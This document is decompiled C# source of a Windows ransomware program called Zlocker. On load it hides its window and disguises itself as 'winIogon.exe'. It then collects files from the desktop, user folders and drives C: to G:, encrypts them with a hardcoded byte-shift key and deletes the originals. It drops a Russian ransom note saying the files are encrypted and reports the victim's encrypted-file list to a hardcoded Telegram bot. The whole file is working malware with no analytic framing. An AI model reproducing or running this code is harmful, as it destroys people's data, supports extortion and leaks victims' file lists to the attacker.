using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Zlocker.My;

namespace Zlocker;

[DesignerGenerated]
public class Form1 : Form
{
	private string tts;

	private string id;

	private string pas;

	private string tex;

	private IContainer components;

	internal virtual ListBox ListBox1
	{
		[CompilerGenerated]
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = ListBox1_DoubleClick;
			ListBox listBox = _ListBox1;
			if (listBox != null)
			{
				((Control)listBox).remove_DoubleClick(eventHandler);
			}
			_ListBox1 = value;
			listBox = _ListBox1;
			if (listBox != null)
			{
				((Control)listBox).add_DoubleClick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("ListBox2")]
	internal virtual ListBox ListBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("ListBox3")]
	internal virtual ListBox ListBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("RichTextBox1")]
	internal virtual RichTextBox RichTextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("RichTextBox5")]
	internal virtual RichTextBox RichTextBox5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		id = "180822997";
		pas = "AfkeRkh76D875bjgffKIUT56";
		InitializeComponent();
	}

	public void playtogame(string pass, string Inp, string outp, bool play)
	{
		byte[] array = File.ReadAllBytes(Inp);
		checked
		{
			byte[] array2 = new byte[array.Length - 1 + 1];
			int length = pass.Length;
			byte[] bytes = Encoding.ASCII.GetBytes(pass);
			int[] array3 = new int[bytes.Length - 1 + 1];
			bytes.CopyTo(array3, 0);
			if (play)
			{
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					array2[i] = (byte)unchecked(checked(unchecked((int)array[i]) + array3[unchecked(i % length)]) % 256);
				}
			}
			else
			{
				int num2 = array.Length - 1;
				for (int j = 0; j <= num2; j++)
				{
					array2[j] = (byte)unchecked(checked(256 + unchecked((int)array[j]) - array3[unchecked(j % length)]) % 256);
				}
			}
			File.WriteAllBytes(outp, array2);
		}
	}

	public object B(char s, byte inp, bool play)
	{
		checked
		{
			if (play)
			{
				return Interaction.IIf(unchecked((int)inp) + Strings.Asc(s) > 255, (object)(unchecked((int)inp) + Strings.Asc(s) - 256), (object)(unchecked((int)inp) + Strings.Asc(s)));
			}
			return Interaction.IIf(unchecked((int)inp) - Strings.Asc(s) < 0, (object)(256 + unchecked((int)inp) - Strings.Asc(s)), (object)(unchecked((int)inp) - Strings.Asc(s)));
		}
	}

	public void LOGS()
	{
		string uriString = "https://api.telegram.org/bot379720942:AAEfoWyvUC0T2gY12T5PIsamNtZ1m2gmRTw/SendMessage?chat_id=" + id + "&text=[ZLATAN]  Зашифрован новый пользователь." + DateTime.Now.ToString() + " | Зашифровано файлов: " + tts + " | Зашифрованные файлы: " + RichTextBox1.get_Text();
		Uri address = new Uri(uriString);
		WebClient webClient = new WebClient();
		webClient.DownloadString(address);
		webClient.Dispose();
	}

	public void soobshenia()
	{
		int count = ListBox2.get_Items().get_Count();
		for (int i = 1; i <= count; i = checked(i + 1))
		{
			DateAndTime.get_Now();
			DateAndTime.get_Now().AddDays(7.0);
			string text = ListBox2.get_Items().get_Item(0).ToString() + "\\";
			try
			{
				File.WriteAllText(text + "ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ.txt", tex);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				File.WriteAllText(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "/ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ.txt", tex);
				ProjectData.ClearProjectError();
			}
		}
		LOGS();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void create()
	{
		checked
		{
			tts = Conversions.ToString(ListBox1.get_Items().get_Count() * 2);
			try
			{
				int count = ListBox1.get_Items().get_Count();
				for (int i = 1; i <= count; i++)
				{
					string text = ListBox1.get_Items().get_Item(0).ToString();
					string outp = text + "╘";
					playtogame(pas, text, outp, play: true);
					FileSystem.Kill(text);
					RichTextBox1.set_Text(RichTextBox1.get_Text() + ListBox1.get_Items().get_Item(0).ToString() + "\r\n");
					ListBox1.get_Items().RemoveAt(0);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			soobshenia();
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
	}

	private void ListBox1_DoubleClick(object sender, EventArgs e)
	{
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		create();
		Timer1.set_Enabled(false);
	}

	public void start()
	{
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop()))
			{
				ListBox2.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\"))
			{
				ListBox2.get_Items().Add((object)directory2);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("D:\\"))
			{
				ListBox2.get_Items().Add((object)directory3);
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("E:\\"))
			{
				ListBox2.get_Items().Add((object)directory4);
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("F:\\"))
			{
				ListBox2.get_Items().Add((object)directory5);
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\Users\\Guchinov_2\\Documents\\Visual Studio 2013\\Projects\\Zlocker\\Zlocker\\bin\\Debug\\Получить\\"))
			{
				ListBox2.get_Items().Add((object)directory6);
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\Program Files"))
			{
				ListBox2.get_Items().Add((object)directory7);
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory8 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("G:\\"))
			{
				ListBox2.get_Items().Add((object)directory8);
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory9 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments()))
			{
				ListBox2.get_Items().Add((object)directory9);
			}
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory10 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop()))
			{
				ListBox3.get_Items().Add((object)directory10);
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory11 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\"))
			{
				ListBox3.get_Items().Add((object)directory11);
			}
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory12 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("D:\\"))
			{
				ListBox3.get_Items().Add((object)directory12);
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory13 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("E:\\"))
			{
				ListBox3.get_Items().Add((object)directory13);
			}
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory14 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("F:\\"))
			{
				ListBox3.get_Items().Add((object)directory14);
			}
		}
		catch (Exception projectError14)
		{
			ProjectData.SetProjectError(projectError14);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory15 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\Program Files"))
			{
				ListBox3.get_Items().Add((object)directory15);
			}
		}
		catch (Exception projectError15)
		{
			ProjectData.SetProjectError(projectError15);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory16 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("G:\\"))
			{
				ListBox3.get_Items().Add((object)directory16);
			}
		}
		catch (Exception projectError16)
		{
			ProjectData.SetProjectError(projectError16);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory17 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments()))
			{
				ListBox3.get_Items().Add((object)directory17);
			}
		}
		catch (Exception projectError17)
		{
			ProjectData.SetProjectError(projectError17);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(ListBox3.get_Items().get_Item(0).ToString()))
			{
				ListBox1.get_Items().Add((object)file);
				ListBox3.get_Items().RemoveAt(0);
			}
		}
		catch (Exception projectError18)
		{
			ProjectData.SetProjectError(projectError18);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop()))
			{
				ListBox1.get_Items().Add((object)file2);
			}
		}
		catch (Exception projectError19)
		{
			ProjectData.SetProjectError(projectError19);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyPictures()))
			{
				ListBox1.get_Items().Add((object)file3);
			}
		}
		catch (Exception projectError20)
		{
			ProjectData.SetProjectError(projectError20);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("C:\\Users\\Guchinov_2\\Documents\\Visual Studio 2013\\Projects\\Zlocker\\Zlocker\\bin\\Debug\\Получить\\"))
			{
				ListBox1.get_Items().Add((object)file4);
			}
		}
		catch (Exception projectError21)
		{
			ProjectData.SetProjectError(projectError21);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic()))
			{
				ListBox1.get_Items().Add((object)file5);
			}
		}
		catch (Exception projectError22)
		{
			ProjectData.SetProjectError(projectError22);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_CurrentDirectory()))
			{
				ListBox1.get_Items().Add((object)file6);
			}
		}
		catch (Exception projectError23)
		{
			ProjectData.SetProjectError(projectError23);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Programs()))
			{
				ListBox1.get_Items().Add((object)file7);
			}
		}
		catch (Exception projectError24)
		{
			ProjectData.SetProjectError(projectError24);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file8 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("C:\\Program Files\\"))
			{
				ListBox1.get_Items().Add((object)file8);
			}
		}
		catch (Exception projectError25)
		{
			ProjectData.SetProjectError(projectError25);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file9 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("C:\\"))
			{
				ListBox1.get_Items().Add((object)file9);
			}
		}
		catch (Exception projectError26)
		{
			ProjectData.SetProjectError(projectError26);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file10 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("D:\\"))
			{
				ListBox1.get_Items().Add((object)file10);
			}
		}
		catch (Exception projectError27)
		{
			ProjectData.SetProjectError(projectError27);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file11 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("E:\\"))
			{
				ListBox1.get_Items().Add((object)file11);
			}
		}
		catch (Exception projectError28)
		{
			ProjectData.SetProjectError(projectError28);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file12 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("F:\\"))
			{
				ListBox1.get_Items().Add((object)file12);
			}
		}
		catch (Exception projectError29)
		{
			ProjectData.SetProjectError(projectError29);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file13 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\Новая папка\\"))
			{
				ListBox1.get_Items().Add((object)file13);
			}
		}
		catch (Exception projectError30)
		{
			ProjectData.SetProjectError(projectError30);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file14 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\Новая папка(2)\\"))
			{
				ListBox1.get_Items().Add((object)file14);
			}
		}
		catch (Exception projectError31)
		{
			ProjectData.SetProjectError(projectError31);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file15 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\фото\\"))
			{
				ListBox1.get_Items().Add((object)file15);
			}
		}
		catch (Exception projectError32)
		{
			ProjectData.SetProjectError(projectError32);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file16 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\1\\"))
			{
				ListBox1.get_Items().Add((object)file16);
			}
		}
		catch (Exception projectError33)
		{
			ProjectData.SetProjectError(projectError33);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file17 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\учёба\\"))
			{
				ListBox1.get_Items().Add((object)file17);
			}
		}
		catch (Exception projectError34)
		{
			ProjectData.SetProjectError(projectError34);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file18 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\документы\\"))
			{
				ListBox1.get_Items().Add((object)file18);
			}
		}
		catch (Exception projectError35)
		{
			ProjectData.SetProjectError(projectError35);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file19 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\музыка\\"))
			{
				ListBox1.get_Items().Add((object)file19);
			}
		}
		catch (Exception projectError36)
		{
			ProjectData.SetProjectError(projectError36);
			ProjectData.ClearProjectError();
		}
		Timer1.set_Enabled(true);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Control)this).Hide();
		tex = RichTextBox5.get_Text();
		start();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		ListBox1 = new ListBox();
		ListBox2 = new ListBox();
		Timer1 = new Timer(components);
		ListBox3 = new ListBox();
		RichTextBox1 = new RichTextBox();
		RichTextBox5 = new RichTextBox();
		((Control)this).SuspendLayout();
		((ListControl)ListBox1).set_FormattingEnabled(true);
		((Control)ListBox1).set_Location(new Point(110, 5));
		((Control)ListBox1).set_Name("ListBox1");
		((Control)ListBox1).set_Size(new Size(23, 82));
		((Control)ListBox1).set_TabIndex(3);
		((Control)ListBox1).set_Visible(false);
		((ListControl)ListBox2).set_FormattingEnabled(true);
		((Control)ListBox2).set_Location(new Point(23, 152));
		((Control)ListBox2).set_Name("ListBox2");
		((Control)ListBox2).set_Size(new Size(400, 121));
		((Control)ListBox2).set_TabIndex(4);
		((Control)ListBox2).set_Visible(false);
		Timer1.set_Interval(5000);
		((ListControl)ListBox3).set_FormattingEnabled(true);
		((Control)ListBox3).set_Location(new Point(186, 119));
		((Control)ListBox3).set_Name("ListBox3");
		((Control)ListBox3).set_Size(new Size(400, 121));
		((Control)ListBox3).set_TabIndex(5);
		((Control)ListBox3).set_Visible(false);
		((Control)RichTextBox1).set_Location(new Point(429, 176));
		((Control)RichTextBox1).set_Name("RichTextBox1");
		((Control)RichTextBox1).set_Size(new Size(100, 96));
		((Control)RichTextBox1).set_TabIndex(6);
		RichTextBox1.set_Text("");
		((Control)RichTextBox1).set_Visible(false);
		((Control)RichTextBox5).set_Location(new Point(4, 5));
		((Control)RichTextBox5).set_Name("RichTextBox5");
		((Control)RichTextBox5).set_Size(new Size(100, 96));
		((Control)RichTextBox5).set_TabIndex(7);
		RichTextBox5.set_Text(componentResourceManager.GetString("RichTextBox5.Text"));
		((Control)RichTextBox5).set_Visible(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(145, 89));
		((Control)this).get_Controls().Add((Control)(object)RichTextBox5);
		((Control)this).get_Controls().Add((Control)(object)RichTextBox1);
		((Control)this).get_Controls().Add((Control)(object)ListBox3);
		((Control)this).get_Controls().Add((Control)(object)ListBox2);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_Text("winIogon.exe");
		((Control)this).ResumeLayout(false);
	}
}
